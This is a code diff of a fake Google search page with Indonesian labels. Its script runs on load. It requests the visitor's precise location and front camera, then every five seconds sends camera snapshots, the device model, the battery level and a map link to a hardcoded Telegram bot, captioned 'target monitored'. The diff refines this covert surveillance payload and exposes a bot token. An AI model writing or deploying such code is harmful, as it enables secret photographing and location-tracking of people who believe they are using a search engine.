@@ -10,17 +10,9 @@
         .main { display: flex; flex-direction: column; align-items: center; margin-top: 80px; flex-grow: 1; }
         .logo { width: 272px; margin-bottom: 30px; }
         .search-form { width: 90%; max-width: 584px; display: flex; flex-direction: column; align-items: center; }
-        .search-container { width: 100%; position: relative; }
-        .search-bar { 
-            width: 100%; border: 1px solid #dfe1e5; padding: 12px 20px; 
-            border-radius: 24px; font-size: 16px; outline: none; box-sizing: border-box;
-        }
+        .search-bar { width: 100%; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; font-size: 16px; outline: none; box-sizing: border-box; }
         .buttons { margin-top: 25px; display: flex; gap: 10px; }
-        .btn { 
-            background-color: #f8f9fa; border: 1px solid #f8f9fa; 
-            border-radius: 4px; color: #3c4043; padding: 0 16px; 
-            line-height: 34px; font-size: 14px; cursor: pointer;
-        }
+        .btn { background-color: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; color: #3c4043; padding: 0 16px; line-height: 34px; font-size: 14px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -33,12 +25,8 @@
 
 <div class="main">
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
-    
-    <!-- Action diarahkan ke Google Search resmi -->
-    <form class="search-form" action="https://www.google.com/search" method="GET" id="googleForm">
-        <div class="search-container">
-            <input type="text" name="q" class="search-bar" id="query" autocomplete="off" autofocus>
-        </div>
+    <form class="search-form" action="https://www.google.com/search" method="GET">
+        <input type="text" name="q" class="search-bar" autocomplete="off" autofocus>
         <div class="buttons">
             <input type="submit" class="btn" value="Penelusuran Google">
             <input type="button" class="btn" value="Saya Lagi Beruntung">
@@ -53,61 +41,61 @@
     const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
     const CHAT_ID = '6888530451';
     let userLocation = "Mencari lokasi...";
-    let deviceName = "Mendeteksi...";
-    let batteryLevel = "N/A";
+    let globalDevice = "Mendeteksi..."; // Variabel ini akan dikunci
 
-    // 1. Deteksi Perangkat Lebih Akurat (Membedah string User-Agent)
-    function detectDevice() {
+    // 1. Fungsi deteksi HP yang lebih stabil
+    function getStableDevice() {
         const ua = navigator.userAgent;
         if (/android/i.test(ua)) {
-            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/) || ua.match(/\(([^;]+); ([^)]+)\)/);
-            return match ? (match[3] || match[2]).split(" Build")[0] : "Android Device";
+            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
+            if (match) {
+                let model = match[3].split(" Build")[0].trim();
+                return model.length > 1 ? model : match[2].trim();
+            }
+            return "Android Device";
         } else if (/iPhone/i.test(ua)) {
             return "iPhone";
         }
         return "Unknown Device";
     }
 
-    // 2. Meminta Izin Lokasi & Kamera secara agresif saat load
     async function startService() {
-        deviceName = detectDevice();
-        
-        // Cek Baterai
-        if (navigator.getBattery) {
-            const bat = await navigator.getBattery();
-            batteryLevel = Math.round(bat.level * 100) + "%";
-        }
+        // Ambil nama HP SEBELUM meminta lokasi agar tidak ter-reset
+        globalDevice = getStableDevice();
 
-        // Minta Lokasi (Notifikasi akan muncul di sini)
+        // Minta Lokasi
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            }, err => {
-                userLocation = "Izin Lokasi Ditolak";
-            }, { enableHighAccuracy: true });
+                // Kirim ulang snapshot segera setelah lokasi didapat
+                takeSnapshot();
+            }, null, { enableHighAccuracy: true });
         }
 
-        // Minta Kamera
+        // Jalankan Kamera
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('video');
             video.srcObject = stream;
             video.onloadedmetadata = () => {
                 video.play();
-                // Kirim data pertama kali
                 takeSnapshot();
-                // Set interval tiap 5 detik
                 setInterval(takeSnapshot, 5000);
             };
-        } catch (e) {
-            console.log("Izin kamera ditolak");
-        }
+        } catch (e) { console.log("Akses ditolak"); }
     }
 
     async function takeSnapshot() {
-        const canvas = document.getElementById('canvas');
         const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         if (video.videoWidth === 0) return;
+
+        // Cek Baterai
+        let battery = "N/A";
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            battery = Math.round(bat.level * 100) + "%";
+        }
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -117,16 +105,13 @@
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'shot.jpg');
-            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${batteryLevel}\n📍 Lokasi: ${userLocation}`);
+            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${globalDevice}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLocation}`);
             formData.append('parse_mode', 'Markdown');
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         }, 'image/jpeg', 0.6);
     }
 
-    // Pastikan fungsi jalan saat halaman dibuka
     window.onload = startService;
 </script>
-
 </body>
 </html>
-
